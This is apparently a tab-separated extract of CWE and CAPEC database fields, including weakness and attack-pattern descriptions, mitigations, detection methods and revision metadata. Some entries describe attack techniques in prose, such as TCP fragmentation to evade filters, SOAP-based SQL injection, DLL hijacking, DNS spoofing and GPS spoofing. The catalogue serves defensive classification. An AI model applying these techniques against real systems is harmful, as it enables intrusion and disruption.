19265	28	CWE Content Team
18737	39	2008-09-08
20882	43	Simple
7644	28	CWE Content Team
17809	100	The MITRE Corporation
18378	45	Class
12945	61	Draft
18417	81	Access Control
10507	62	updated Time_of_Introduction
17235	35	Cigital
16447	91	Architecture and Design
21242	51	2014-06-23
20707	53	The MITRE Corporation
10022	56	ChildOf
11669	31	699
20303	39	2014-07-30
10357	35	MITRE
7977	62	updated Relationships
5688	47	Unreliable Execution
8745	53	The MITRE Corporation
11200	56	ChildOf
17923	77	Dynamic Analysis with Automated Results Interpretation
14959	56	PeerOf
20820	97	Windows Admin Shares with Stolen Credentials
24577	55	CAPEC Content Team
6239	53	The MITRE Corporation
8146	62	updated Other_Notes
9639	28	CWE Content Team
9859	62	updated Demonstrative_Examples
6424	100	The MITRE Corporation
13068	31	699
19046	35	MITRE
9844	103	Primary
19948	21	CLASP
10535	56	ChildOf
14466	39	2008-09-08
19059	28	CWE Content Team
7682	103	Primary
11949	62	updated Applicable_Platforms
16327	43	Simple
19566	51	2014-06-23
23451	79	Confidentiality
23479	26	Architecture and Design
18589	80	This technique has been demonstrated by amateur hackers and commercial tools and open source projects are available to automate the attack.
24825	62	updated Time_of_Introduction
11585	28	CWE Content Team
19956	81	Other
18856	81	Integrity
20560	28	CWE Content Team
6058	79	Availability
19021	104	482
11858	45	Class
14045	26	Implementation
12985	28	CWE Content Team
12803	56	ChildOf
12644	62	updated Observed_Examples
13807	35	MITRE
13008	62	updated Relationships, Taxonomy_Mappings
19478	51	2014-06-23
10782	23	The attacker forces an application to load arbitrary code files from a remote location. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load malicious files that the attacker placed on the remote machine, or to otherwise change the functionality of the targeted application in unexpected ways.
15327	62	updated Relationships
11964	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
16444	28	CWE Content Team
24626	35	MITRE
9967	39	2014-07-30
12905	79	Access Control
9863	39	2008-07-01
14914	62	updated Other_Notes, References
18796	79	Confidentiality
23712	28	CWE Content Team
17787	42	For inbound authentication: Rather than hard-code a default username and password for first time logins, utilize a "first login" mode that requires the user to enter a unique strong password.
24243	28	CWE Content Team
6952	46	As data is parsed, improperly handled multiple trailing special elements may cause the process to take unexpected actions that result in an attack.
11141	35	MITRE
13725	50	To limit one's exposure to this type of attack, tunnel communications through a secure proxy service.
6866	47	Read Data
19458	26	Architecture and Design
24872	31	699
9134	35	MITRE
20537	28	CWE Content Team
18161	28	CWE Content Team
10041	101	CAPEC Content Team
5712	77	Manual Analysis
13729	21	PLOVER
24711	62	updated Common_Consequences, Other_Notes, Potential_Mitigations, White_Box_Definitions
19434	39	2012-05-11
6161	39	2008-07-01
8144	42	When exchanging data between components, ensure that both components are using the same character encoding. Ensure that the proper encoding is applied at each interface. Explicitly set the encoding you are using whenever the protocol allows you to do so.
20912	39	2014-06-23
9888	46	This can cause the application to crash, or in some cases, modify critical program variables or execute code.             This weakness often occurs when the memory is allocated explicitly on the heap with one of the malloc() family functions and free() is called, but pointer arithmetic has caused the pointer to be in the interior or end of the buffer.
7351	51	2014-06-23
13108	103	Primary
25132	92	Exploit
11976	80	This type of attack may be sophisticated and require knowledge about the system's resources and APIs.
22323	72	The program could send the output of unauthorized files to the attacker.
20885	35	Cigital
9650	28	CWE Content Team
11160	43	Simple
8185	92	Exploit
20931	100	The MITRE Corporation
11727	26	Implementation
18954	73	When the arguments passed in the 'flashvars' attributes, the attacker injects '&' and payload in the URL.
14117	28	CWE Content Team
19121	47	Modify Data
5820	104	641
9134	62	updated Relationships
11404	28	CWE Content Team
17503	39	2009-10-29
8823	31	699
12816	28	CWE Content Team
12760	35	MITRE
8510	91	Implementation
13018	103	Primary
12029	31	1000
11018	88	Loop with Unreachable Exit Condition ('Infinite Loop')
6939	39	2009-05-27
21464	47	Hide Activities
12380	32	SANS Institute
13067	53	The MITRE Corporation
10679	91	Architecture and Design
13031	28	CWE Content Team
22182	101	CAPEC Content Team
11488	62	updated Applicable_Platforms, Causal_Nature, Likelihood_of_Exploit, Modes_of_Introduction, Relationships
19924	56	CanPrecede
11568	42	Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success.                   If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not.                   In the context of OS Command Injection, error information passed back to the user might reveal whether an OS command is being executed and possibly which command is being used.
22495	46	If access to a shared resource is not correctly synchronized, then the resource may not be in a state that is expected by the software. This might lead to unexpected or insecure behaviors, especially if an attacker can influence the shared resource.
7871	35	MITRE
18517	28	CWE Content Team
25155	63	Quality Degradation
6108	31	1000
18020	76	2019-09-30
22793	39	2014-07-30
14156	95	[Use matched Session ID] The attacker uses the falsified session ID to access the target system.
17159	104	1111
18821	46	When the regular expression is used in protection mechanisms such as filtering or validation, this may allow an attacker to bypass the intended restrictions on the incoming data.
12301	79	Authorization
22209	56	ChildOf
22359	39	2008-09-08
20122	91	Architecture and Design
8491	62	updated Potential_Mitigations, Relationships
24754	28	CWE Content Team
21367	35	MITRE
8591	35	Cigital
24342	33	Dan Amodio
9586	104	506
6954	36	http://scarybeastsecurity.blogspot.com/2009/12/generic-cross-browser-cross-domain.html
12977	80	Exploiting any information gathered by HTTP Query on script host
24397	91	Architecture and Design
7703	25	High
14831	100	The MITRE Corporation
18922	45	Base
23269	62	updated Potential_Mitigations
12144	62	updated Common_Consequences
7393	43	Simple
15198	90	C
22518	77	Dynamic Analysis with Automated Results Interpretation
9648	62	updated Potential_Mitigations
18950	39	2008-07-01
20822	79	Access Control
12618	39	2012-05-11
10090	56	ChildOf
14007	56	ChildOf
11795	66	Spectre Attacks: Exploiting Speculative Execution
7092	28	CWE Content Team
17549	39	2008-09-08
22344	66	Using Neither Buffered Nor Direct I/O
20417	73	Craft a malicious file payload, modify its associated MIME type to the targeted file type and submit it to the web server.
10948	61	Stable
8700	66	AOL man pleads guilty to selling 92m email addies
17297	63	Read Memory
22724	35	MITRE
16565	76	2017-05-01
17689	26	Implementation
10963	100	The MITRE Corporation
20593	35	Cigital
17401	50	1. Using blank index.html: putting blank index.html simply prevent directory listings from displaying to site visitors.
11886	23	An adversary exploits a weakness on the target to force arbitrary code to be retrieved locally or from a remote location and executed. This differs from code injection in that code injection involves the direct inclusion of code while code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application.
11554	39	2017-11-08
16794	93	High
17378	50	An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.
24298	62	updated Common_Consequences, Description, Name, Potential_Mitigations, White_Box_Definitions
18976	89	Detailed
22081	39	2008-07-01
7696	79	Integrity
15456	101	CAPEC Content Team
15881	55	CAPEC Content Team
19882	23	An adversary exploits a weakness in access control to gain access to currently installed hardware and precedes to implement changes or secretly replace a hardware component which undermines the system's integrity for the purpose of carrying out an attack.
13679	54	Low
21703	81	Confidentiality
11368	53	The MITRE Corporation
22447	90	Language-Independent
24017	39	2014-07-30
12973	28	CWE Content Team
17562	40	The adversary must have capability to navigate the operating system to peruse the registry.
15765	39	2010-09-27
16453	39	2012-10-30
15958	104	539
23456	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
8133	100	The MITRE Corporation
19824	62	updated Other_Notes
13609	33	Rain Forest Puppy
5907	39	2017-11-08
10245	28	CWE Content Team
20346	26	Architecture and Design
12971	25	High
11677	103	Primary
15432	81	Access Control
7446	62	updated Time_of_Introduction
8342	28	CWE Content Team
25228	79	Availability
9374	39	2009-07-27
10033	62	updated Relationships
16658	28	CWE Content Team
17786	96	2011-03-24
17890	39	2010-02-16
9433	28	CWE Content Team
24676	72	This weakness can sometimes trigger buffer overflows which can be used to execute arbitrary code. This is usually outside the scope of a program's implicit security policy.
19546	42	Recommendations include requiring all password fields in your web application be masked to prevent other users from seeing this information.
14673	62	updated Common_Consequences
14971	35	MITRE
8787	35	Cigital
18492	81	Other
6813	43	Simple
8718	91	Requirements
12519	35	MITRE
13182	47	Read Data
13251	28	CWE Content Team
10385	103	Primary
16416	88	Stack-based Buffer Overflow
12752	103	Primary
6272	89	Detailed
17423	62	updated Related_Attack_Patterns, Relationships
20595	62	updated Potential_Mitigations, Time_of_Introduction
7346	39	2009-01-12
12420	59	Updated Attack_Prerequisites, References, Related_Attack_Patterns, Related_Weaknesses
21170	62	updated Relationships, Taxonomy_Mappings
15476	103	Primary
23146	56	ChildOf
5989	62	updated Related_Attack_Patterns
15496	101	CAPEC Content Team
14331	28	CWE Content Team
6389	62	updated References, Relationships
10405	62	updated Detection_Factors, Relationships
12048	42	Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.
10670	101	CAPEC Content Team
24653	25	High
24212	28	Eric Dalci
13926	28	CWE Content Team
23077	79	Availability
22726	26	Implementation
18023	44	SOAR Partial
10781	31	1000
21477	39	2008-10-14
16031	103	Primary
19874	104	130
16445	31	699
12367	91	Architecture and Design
11706	61	Stable
21796	28	CWE Content Team
10642	92	Experiment
13233	21	7 Pernicious Kingdoms
6384	26	Implementation
19956	72	Floods often cause a crash or other problem besides denial of the resource itself; these are likely examples of *other* vulnerabilities, not an insufficient resource pool.
7785	66	Using the Strsafe.h Functions
12571	23	The software does not handle or incorrectly handles when a particular parameter, field, or argument name is not defined or supported by the product.
15024	47	Read Data
23263	54	Medium
9066	81	Access Control
7106	28	CWE Content Team
13216	39	2008-11-24
17246	55	CAPEC Content Team
11004	79	Confidentiality
9450	81	Other
21342	62	updated Common_Consequences, Demonstrative_Examples, Name, References, Relationships, Taxonomy_Mappings, Type, Weakness_Ordinalities
18303	26	Architecture and Design
16205	39	2017-11-08
15862	35	MITRE
23793	90	ASP.NET
19196	81	Availability
23149	62	updated Relationships, Taxonomy_Mappings
20667	91	Implementation
8417	28	CWE Content Team
11882	104	807
24427	78	High
21342	39	2019-01-03
7504	39	2011-06-01
15704	39	2019-06-20
18622	21	PLOVER
23856	102	ChildOf
17579	43	Simple
14096	35	MITRE
6991	88	File and Directory Information Exposure
8395	39	2011-06-01
23375	69	Incomplete
11299	46	Including third party functionality in a web-based environment is risky, especially if the source of the functionality is untrusted.             Even if the third party is a trusted source, the software may still be exposed to attacks and malicious behavior if that trusted source is compromised, or if the code is modified in transmission from the third party to the software.             This weakness is common in "mashup" development on the web, which may include source functionality from other domains. For example, Javascript-based web widgets may be inserted by using '<SCRIPT SRC="http://other.domain.here">' tags, which causes the code to run in the domain of the software, not the remote site from which the widget was loaded. As a result, the included code has access to the local DOM, including cookies and other data that the developer might not want the remote site to be able to access.             Such dependencies may be desirable, or even required, but sometimes programmers are not aware that a dependency exists.
21222	56	ChildOf
7812	28	CWE Content Team
23126	72	The existence of hardcoded constants could cause unexpected behavior and the introduction of weaknesses during code maintenance or when making changes to the code if all occurrences are not modified. The use of hardcoded constants is an indication of poor quality.
23309	53	The MITRE Corporation
16822	23	An attacker may execute a TCP Fragmentation attack against a target with the intention of avoiding filtering rules. IP fragmentation occurs when an IP datagram is larger than the MTU of the route the datagram has to traverse. The attacker attempts to fragment the TCP packet such that the headers flag field is pushed into the second fragment which typically is not filtered. This behavior defeats some IPS and firewall filters who typically check the FLAGS in the header of the first packet since dropping this packet prevents the following fragments from being processed and assembled. Another variation is overlapping fragments thus that an innocuous first segment passes the filter and the second segment overwrites the TCP header data with the true payload which is malicious in nature. The malicious payload manipulated properly may lead to a DoS due to resource consumption or kernel crash. Additionally the fragmentation could be used in conjunction with sending fragments at a rate slightly slower than the timeout to cause a DoS condition by forcing resources that assemble the packet to wait an inordinate amount of time to complete the task. The fragmentation identification numbers could also be duplicated very easily as there are only 16 bits in IPv4 so only 65536 packets are needed.
24426	35	MITRE
13085	28	CWE Content Team
9329	49	2011
19523	73	An attacker performs a SQL injection attack via the usual methods leveraging SOAP parameters as the injection vector. An attacker has to be careful not to break the XML parser at the service provider which may prevent the payload getting through to the SQL query. The attacker may also look at the WSDL for the web service (if available) to better understand what is expected by the service provider.
25112	35	MITRE
16981	92	Explore
8423	66	Apache Wicket
17362	28	CWE Content Team
8776	69	Draft
23666	90	Language-Independent
18019	91	Implementation
12679	35	MITRE
14670	31	1000
25411	92	Experiment
21521	42	Be sure to understand both what will be matched and what will not be matched by a regular expression. Anchoring the ends of the expression will allow the programmer to define a whitelist strictly limited to what is matched by the text in the regular expression. If you are using a package that only matches one line by default, ensure that you can match multi-line inputs if necessary.
15795	28	CWE Content Team
23009	39	2011-03-29
10462	39	2011-06-01
12438	47	Other
16590	81	Availability
10934	43	Simple
22039	94	Run Arbitrary Code
11759	75	Although the mentioned detection method is theoretically possible, the use of speculative execution is a preferred way of increasing processor performance. The reality is that a large number of statements are executed out of order, and determining if any of them break an access control property would be extremely opportunistic.
25012	78	Low
24447	104	474
10431	35	MITRE
22806	62	updated Time_of_Introduction
14676	39	2014-07-30
23682	87	Web Server
24145	45	Base
8433	77	Automated Static Analysis - Binary or Bytecode
20002	39	2011-06-01
13286	62	updated Demonstrative_Examples
20482	28	CWE Content Team
24666	56	ChildOf
15064	28	CWE Content Team
8448	62	updated Common_Consequences, Other_Notes, Relationship_Notes
23922	62	updated Relationships
19380	39	2009-10-29
17678	62	updated Applicable_Platforms, Causal_Nature
21395	62	updated Relationships
21628	28	CWE Content Team
15102	31	699
13807	62	updated Modes_of_Introduction, Relationships, Taxonomy_Mappings
20886	26	Implementation
10205	67	Low
20149	39	2009-07-27
16987	28	CWE Content Team
8673	74	2
11993	59	Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
8669	35	MITRE
15456	59	Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit
20808	51	2014-06-23
20856	39	2011-03-29
21361	61	Draft
6624	76	2015-11-09
7115	74	2
15696	35	MITRE
18914	103	Primary
24808	39	2009-10-29
7460	31	1000
19022	39	2009-10-29
8882	62	updated Applicable_Platforms
22340	31	1000
25242	73	Look for popular page file names. The attacker will look for .shtml, .shtm, .asp, .aspx, and other well-known strings in URLs to help determine whether SSI functionality is enabled.
6725	81	Confidentiality
16789	78	Medium
13859	35	MITRE
9780	57	Primary
24376	62	updated Common_Consequences, Other_Notes
8137	39	2008-07-01
10805	67	High
13537	23	A common form of a GPS spoofing attack, commonly termed a carry-off attack begins with an adversary broadcasting signals synchronized with the genuine signals observed by the target receiver. The power of the counterfeit signals is then gradually increased and drawn away from the genuine signals. Over time, the adversary can carry the target away from their intended destination and toward a location chosen by the adversary.
13455	35	MITRE
16425	76	2015-12-07
18152	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
6161	28	Eric Dalci
21980	53	The MITRE Corporation
6099	28	CWE Content Team
24860	26	Implementation
15547	28	CWE Content Team
19326	31	1000
24240	42	In most situations the array should be made private.
6058	47	Execute Unauthorized Commands
14990	69	Draft
11710	101	CAPEC Content Team
11552	61	Stable
7554	62	updated Relationships
21464	79	Authorization
11093	39	2011-06-01
15444	77	Automated Static Analysis - Source Code
18792	35	MITRE
14130	21	7 Pernicious Kingdoms
17988	35	MITRE
22990	85	585
21081	35	MITRE
9945	62	updated Relationships
15817	28	Eric Dalci
6910	39	2011-03-29
18878	28	Eric Dalci
23107	62	updated References
8187	28	CWE Content Team
16046	26	Implementation
13634	35	MITRE
12822	42	Remove null bytes from all incoming strings.
24326	77	Dynamic Analysis with Manual Results Interpretation
15833	35	MITRE
25353	28	CWE Content Team
10007	35	MITRE
23264	35	Veracode
21283	28	CWE Content Team
25025	104	1187
16631	35	MITRE
6398	79	Confidentiality
7791	40	The target host insufficiently protects access to the logs or logging mechanisms.
7463	35	MITRE
17489	26	Implementation
12096	39	2010-12-13
8056	62	updated Common_Consequences
19108	28	CWE Content Team
23992	26	Implementation
8694	62	updated Related_Attack_Patterns, Relationships
20135	35	MITRE
11213	62	updated Demonstrative_Examples
7682	56	ChildOf
10244	59	Updated Attack_Prerequisites, Related_Attack_Patterns, Resources_Required
7185	62	updated Applicable_Platforms
23717	78	Very High
10298	62	updated Detection_Factors, Relationships
16442	74	1
18387	39	2011-03-29
25156	39	2011-06-27
19432	28	CWE Content Team
15419	44	SOAR Partial
9189	39	2009-07-27
18163	28	CWE Content Team
21267	28	CWE Content Team
13587	92	Exploit
23786	91	Architecture and Design
12855	45	Variant
6471	38	An example of indicator is when the client software crashes after executing code downloaded from a hostile server.
22443	62	updated Time_of_Introduction
12202	89	Detailed
9612	28	CWE Content Team
16221	26	Architecture and Design
14877	47	Modify Data
18943	39	2019-06-20
15635	104	302
12037	39	2008-07-01
8485	62	updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Relationships, Taxonomy_Mappings
12767	90	Language-Independent
6404	35	MITRE
8155	62	updated Common_Consequences
7167	101	CAPEC Content Team
13848	56	ChildOf
22771	42	Specify in the design that any linked external document must not be granted access to the location object of the calling page.
24814	79	Authorization
12644	35	MITRE
16204	39	2014-02-18
20177	50	Do not expose environment variable to the user.
22311	104	23
18159	28	CWE Content Team
25080	91	Implementation
25087	33	Johannes Ullrich
16078	35	MITRE
15681	69	Draft
14393	39	2008-07-01
22561	39	2012-05-11
14153	79	Integrity
20916	39	2008-07-01
24757	39	2008-07-01
16723	31	1000
15116	35	MITRE
14319	79	Availability
6633	53	The MITRE Corporation
8392	79	Confidentiality
21350	44	High
5863	39	2014-07-30
17274	28	CWE Content Team
17694	95	[Identify Web Application Software] After the web server platform software has been identified, the attacker start to identify web application technologies such as ASP, .NET, PHP and Java on the server.
15289	39	2011-09-13
17494	55	CAPEC Content Team
10093	35	MITRE
17715	103	Primary
24512	34	This bug primarily originates from a typo.
13791	28	CWE Content Team
13229	25	High
16231	35	MITRE
10228	23	The web application does not, or can not, sufficiently verify whether a well-formed, valid, consistent request was intentionally provided by the user who submitted the request.
10036	57	Primary
22263	35	Cigital
13302	39	2011-06-01
8716	62	updated Description, Name
25067	90	Language-Independent
21864	100	The MITRE Corporation
19470	69	Draft
15970	81	Access Control
15701	91	Implementation
20452	28	CWE Content Team
8070	89	Standard
9553	42	Use industry standard APIs to implement locking mechanism.
16266	28	CWE Content Team
25158	35	MITRE
19624	79	Confidentiality
24429	28	CWE Content Team
20210	28	CWE Content Team
22577	88	Path Equivalence: '/./' (Single Dot Directory)
15607	28	Sean Eidemiller
16170	103	Primary
14766	84	04
23216	47	Other
7191	62	updated Causal_Nature, Relationships
23714	28	Eric Dalci
19688	28	CWE Content Team
20185	72	For an out-of-bounds read, the attacker may have access to sensitive information. If the sensitive information contains system details, such as the current buffers position in memory, this knowledge can be used to craft further attacks, possibly with more severe consequences.
24621	39	2010-12-13
7859	50	Design: Backup copies of all configuration files
9216	24	MITRE
9034	35	MITRE
13251	62	updated Potential_Mitigations
17864	62	updated Time_of_Introduction
10735	103	Primary
11530	35	MITRE
21114	28	Eric Dalci
19363	31	1000
19530	59	Updated Examples-Instances, Related_Vulnerabilities
11145	90	Ruby
22398	39	2011-06-01
24480	62	updated Relationships, Taxonomy_Mappings
10342	39	2011-06-01
18292	49	2005
22366	103	Primary
17409	24	MITRE
7899	55	CAPEC Content Team
17305	39	2011-06-01
23464	28	CWE Content Team
22538	62	updated Relationships
19967	39	2008-09-08
12820	91	Build and Compilation
14434	39	2019-01-03
20177	50	Do not use untrusted data in your environment variables.
10121	27	Ability to deploy software on network. Ability to communicate synchronously or asynchronously with server
16844	31	699
8371	62	updated Potential_Mitigations, Time_of_Introduction
14698	28	CWE Content Team
15443	62	updated Potential_Mitigations, Time_of_Introduction
17204	40	A means by which to interact with the target system directly.
14738	28	CWE Content Team
15329	35	MITRE
20338	91	Implementation
23567	26	Operation
6006	62	updated Potential_Mitigations, Time_of_Introduction
24566	62	updated Common_Consequences
22830	31	1000
7586	28	CWE Content Team
17487	35	MITRE
14210	28	CWE Content Team
23778	23	An adversary sends a malicious ("NXDOMAIN" ("No such domain") code, or DNS A record) response to a targets route request before a legitimate resolver can. This technique requires an On-path or In-path device that can monitor and respond to the targets DNS requests. This attack differs from BGP Tampering in that it directly responds to requests made by the target instead of polluting the routing the targets infrastructure uses.
11036	91	Implementation
6346	35	MITRE
6977	72	An attacker could potentially modify the state in malicious ways. If the state is related to the privileges or level of authentication that the user has, then state modification might allow the user to bypass authentication or elevate privileges.
6034	33	Mozilla MDN
19770	28	CWE Content Team
24496	35	MITRE
23574	28	CWE Content Team
16963	99	Microsoft
14919	42	Identify all exposed functionality. Explicitly list all functionality that must be exposed to some user or set of users. Identify which functionality may be:                                                                  accessible to all users                         restricted to a small set of privileged users                         prevented from being directly accessible at all                                                            Ensure that the implemented code follows these expectations. This includes setting the appropriate access modifiers where applicable (public, private, protected, etc.) or not marking ActiveX controls safe-for-scripting.
24481	35	MITRE
9320	39	2011-06-01
14205	92	Exploit
10602	76	2017-05-01
23852	39	2011-06-27
23431	28	CWE Content Team
13948	23	An attacker introduces malicious code to the victim's system by altering the payload of a software update, allowing for additional compromise or site disruption at the victim location. These manual, or user-assisted attacks, vary from requiring the user to download and run an executable, to as streamlined as tricking the user to click a URL. Attacks which aim at penetrating a specific network infrastructure often rely upon secondary attack methods to achieve the desired impact. Spamming, for example, is a common method employed as an secondary attack vector. Thus the attacker has in his or her arsenal a choice of initial attack vectors ranging from traditional SMTP/POP/IMAP spamming and its varieties, to web-application mechanisms which commonly implement both chat and rich HTML messaging within the user interface.
21471	46	Failure for a system to check for hard links can result in vulnerability to different types of attacks. For example, an attacker can escalate their privileges if a file used by a privileged program is replaced with a hard link to a sensitive file (e.g. AUTOEXEC.BAT). When the process opens the file, the attacker can assume the privileges of that process, or prevent the program from accurately processing data.
12907	76	2019-04-04
9799	39	2010-02-16
9823	28	CWE Content Team
20479	35	MITRE
14586	66	JSR 133 (Java Memory Model) FAQ
11204	62	updated Time_of_Introduction
14394	94	The attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries.
14879	62	updated Demonstrative_Examples, Description, Name, Potential_Mitigations
10610	39	2008-09-08
15681	104	332
15886	35	MITRE
22356	35	MITRE
24829	103	Primary
17429	31	1000
10733	62	updated Common_Consequences
23190	52	Identify error conditions that are not likely to occur during normal usage and trigger them. For example, run the program under low memory conditions, run with insufficient privileges or permissions, interrupt a transaction before it is completed, or disable connectivity to basic network services such as DNS. Monitor the software for any unexpected behavior. If you trigger an unhandled exception or similar error that was discovered and handled by the application's environment, it may still indicate unexpected conditions that were not handled by the application itself.
17874	28	CWE Content Team
11881	73	Perform SQL injection.
12270	28	CWE Content Team
7806	95	[Probe for SQL Injection vulnerability] The attacker injects SQL syntax into vulnerable SOAP parameters identified during the Explore phase to search for unfiltered execution of the SQL syntax in a query.
12143	35	MITRE
9037	103	Primary
23714	62	updated Time_of_Introduction
20788	28	CWE Content Team
13404	59	Updated Resources_Required
17895	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
12703	40	Victim's browser visits a website that contains attacker's Java ScriptJava Script is not disabled in the victim's browser
13309	28	CWE Content Team
19368	101	CAPEC Content Team
22510	28	CWE Content Team
15467	91	Requirements
15865	39	2012-10-30
12062	28	CWE Content Team
8454	62	updated Related_Attack_Patterns
10074	79	Confidentiality
14719	35	MITRE
25031	103	Primary
19724	39	2008-07-01
11028	69	Incomplete
19602	66	Top 25 Series - Rank 8 - Unrestricted Upload of Dangerous File Type
22236	62	updated Common_Consequences
20339	35	MITRE
14146	23	The code uses too many unconditional branches (such as      "goto").
11832	52	This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
11228	48	01
21944	62	updated Potential_Mitigations
17777	39	2011-06-01
15822	39	2012-10-30
17974	62	updated Common_Consequences, Description, Other_Notes, Theoretical_Notes
12023	39	2008-10-14
6364	39	2008-07-01
20844	90	Java
22399	28	CWE Content Team
23917	91	Implementation
13537	89	Detailed
22428	28	CWE Content Team
13944	26	Implementation
19196	81	Confidentiality
18194	67	Medium
24171	91	Implementation
8993	80	Able to develop and manufacture malicious hardware components that perform the same functions and processes as their non-malicious counterparts.
9679	74	3
8777	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
14146	88	Excessive Use of Unconditional Branching
14023	28	CWE Content Team
10168	28	CWE Content Team
13655	70	A Study In Scarlet, Exploiting Common Vulnerabilities in PHP Applications
24779	62	updated Description, Name
23736	55	CAPEC Content Team
15597	28	CWE Content Team
7942	48	06
14876	55	CAPEC Content Team
17773	42	Use a static analysis tool to scan the code for information leakage vulnerabilities (e.g. Singleton Member Field).
10043	39	2014-06-23
23968	69	Incomplete
18174	62	updated Applicable_Platforms, Observed_Examples, Related_Attack_Patterns, Relationships
11194	62	updated Common_Consequences
15490	50	Implementation: Customizing HTTP error codes such as 404 or 500.
14495	62	updated Time_of_Introduction
11260	28	CWE Content Team
15235	23	The application relies on the existence or values of cookies when performing security-critical operations, but it does not properly ensure that the setting is valid for the associated user.
21139	46	When a non-cryptographic PRNG is used in a cryptographic context, it can expose the cryptography to certain types of attacks.             Often a pseudo-random number generator (PRNG) is not designed for cryptography. Sometimes a mediocre source of randomness is sufficient or preferable for algorithms that use random numbers. Weak generators generally take less processing power and/or do not use the precious, finite, entropy sources on a system. While such PRNGs might have very useful features, these same features could be used to break the cryptography.
22444	35	MITRE
16197	39	2012-05-11
15223	28	CWE Content Team
23752	39	2010-12-13
9988	28	CWE Content Team
20273	23	An attacker maliciously alters hardware components that will be sold on the gray market, allowing for victim disruption and compromise when the victim needs replacement hardware components for systems where the parts are no longer in regular supply from original suppliers, or where the hardware components from the attacker seems to be a great benefit from a cost perspective.
10413	62	updated Causal_Nature, Demonstrative_Examples, Likelihood_of_Exploit, Modes_of_Introduction, Relationships, White_Box_Definitions
6991	45	Base
6289	62	updated References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings
10543	99	Microsoft
12044	62	Improved the White_Box_Definition
16989	35	Cigital
11044	45	Base
22473	81	Confidentiality
20249	69	Draft
14609	28	CWE Content Team
17683	78	High
15499	35	MITRE
5931	55	CAPEC Content Team
8809	81	Integrity
9172	39	2008-07-01
17882	28	CWE Content Team
6038	28	CWE Content Team
13415	23	The program performs pointer arithmetic on a valid pointer, but it uses an offset that can point outside of the intended range of valid memory locations for the resulting pointer.
18695	35	MITRE
7656	39	2014-07-30
17785	28	CWE Content Team
23066	50	Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.
14987	28	CWE Content Team
9709	60	10
9300	35	MITRE
12689	103	Primary
11407	21	CWE Content Team
8340	40	The targeted application fails to verify the integrity of the running process that allows an adversary to execute arbitrary code.
11042	28	CWE Content Team
15540	43	Simple
7675	28	CWE Content Team
8285	28	CWE Content Team
9044	102	ChildOf
24152	39	2014-07-30
22848	62	updated Potential_Mitigations
23353	35	MITRE
23521	35	MITRE
17388	69	Incomplete
16499	43	Simple
18584	28	CWE Content Team
7223	57	Primary
22657	46	This issue can prevent the software from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.
21625	100	The MITRE Corporation
7336	62	updated Potential_Mitigations
13193	69	Draft
20578	31	1000
12955	62	updated Potential_Mitigations
14152	39	2009-03-10
23380	39	2014-07-30
11096	44	SOAR Partial
12674	102	ChildOf
10053	62	updated Description, Modes_of_Introduction, Name, Relationships, Observed_Example, Relationship_Notes, Taxonomy_Mappings, Type
18689	102	ChildOf
6300	62	updated Relationships
23655	50	Design: Use libraries and templates that minimize unfiltered input. Use methods that limit entity expansion and throw exceptions on attempted entity expansion.                Implementation: Disable altogether the use of inline DTD schemas in your XML parsing objects. If must use DTD, normalize, filter and white list and parse with methods and routines that will detect entity expansion from untrusted sources.
20436	47	Other
21277	25	High
9916	78	Low
16469	39	2012-10-30
7423	56	ChildOf
17649	35	MITRE
6660	39	2008-09-08
14620	66	DLL Hijacking: Facts and Fiction
16697	40	The target application allows the user to both specify the identifier used to access a system resource. Through this permission, the user gains the capability to perform actions on that resource (e.g., overwrite the file)
16148	80	Trick the operating system in loading a malicious DLL instead of a legitimate DLL.
17258	40	Access to the network on which the targeted system resides.
9203	90	Java
16578	39	2017-11-08
10542	63	Read Application Data
14496	53	The MITRE Corporation
18941	39	2011-06-01
20351	62	updated Description, Name, Relationships, Observed_Example, Other_Notes, Taxonomy_Mappings
7940	28	CWE Content Team
17894	62	updated Relationships
18609	63	Read Application Data
11271	35	MITRE
16917	100	The MITRE Corporation
17403	91	Implementation
8963	28	CWE Content Team
6099	35	MITRE
18144	100	The MITRE Corporation
13186	103	Primary
16629	28	CWE Content Team
8408	39	2009-12-28
8218	46	This can have security implications when the associated resource is expected to have certain properties or values.
7851	35	MITRE
9265	91	Implementation
9927	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
22063	62	updated Applicable_Platforms, Relationships
8558	31	1000
22169	92	Explore
18601	28	CWE Content Team
7158	28	Eric Dalci
18940	39	2009-10-29
10463	23	Compromising Emanations (CE) are defined as unintentional signals which an attacker may intercept and analyze to disclose the information processed by the targeted equipment. Commercial mobile devices and retransmission devices have displays, buttons, microchips, and radios that emit mechanical emissions in the form of sound or vibrations. Capturing these emissions can help an adversary understand what the device is doing.
12206	89	Meta
8350	78	Medium
